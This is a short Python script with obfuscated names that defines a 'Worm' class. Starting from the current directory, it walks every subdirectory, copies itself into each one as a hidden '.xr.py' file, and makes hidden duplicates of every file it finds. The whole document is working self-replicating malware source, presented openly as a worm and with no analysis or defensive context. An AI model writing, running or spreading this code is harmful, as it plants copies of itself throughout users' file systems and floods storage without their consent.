_A = None
import os, shutil


class Worm:
    def __init__(A, path=_A, target_dir_list=_A, iteration=_A):
        B = target_dir_list
        if isinstance(path, type(_A)):
            A.path = "/"
        else:
            A.path = path
        if isinstance(B, type(_A)):
            A.target_dir_list = []
        else:
            A.target_dir_list = B
        if isinstance(B, type(_A)):
            A.iteration = 2
        else:
            A.iteration = iteration
        A.own_path = os.path.realpath(__file__)

    def l(C, path):
        A = path
        C.target_dir_list.append(A)
        D = os.listdir(A)
        for E in D:
            B = os.path.join(A, E)
            print(B)
            if os.path.isdir(B):
                C.l(B)
            else:
                0

    def n(A):
        for B in A.target_dir_list:
            C = os.path.join(B, ".xr.py")
            shutil.copyfile(A.own_path, C)

    def c(C):
        for A in C.target_dir_list:
            E = os.listdir(A)
            for D in E:
                B = os.path.join(A, D)
                if not B.startswith(".") and not os.path.isdir(B):
                    F = B
                    for G in range(C.iteration):
                        H = os.path.join(A, "." + D + str(G))
                        shutil.copyfile(F, H)

    def s(A):
        A.l(A.path)
        print(A.target_dir_list)
        A.n()
        A.c()


if __name__ == "__main__":
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.s()
